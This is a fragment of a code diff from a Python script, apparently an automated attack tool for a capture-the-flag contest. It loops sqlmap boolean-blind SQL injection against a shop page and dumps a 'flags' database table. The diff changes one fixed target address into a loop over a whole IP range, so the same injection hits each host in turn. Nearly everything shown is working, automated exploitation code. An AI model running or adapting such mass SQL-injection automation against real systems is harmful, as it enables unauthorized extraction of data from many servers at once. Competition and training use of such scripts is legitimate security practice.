@@ -8,7 +8,7 @@ while True:
         if i==5:
             continue
         try:
-            p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.11.2:4001/index.php?page=shop&type=VGA" --technique=B -D vstore -T flags --dump --batch > temp_web{i}.txt""", shell=True)
+            p = subprocess.Popen(f"""python3 /home/ubuntu/sqlmap-dev/sqlmap.py -u "http://10.254.{i}.2:4001/index.php?page=shop&type=VGA" --technique=B -D vstore -T flags --dump --batch > temp_web{i}.txt""", shell=True)
             sleep(5)            
             with open(f"temp_web{i}.txt","r") as f:
                 data=[]
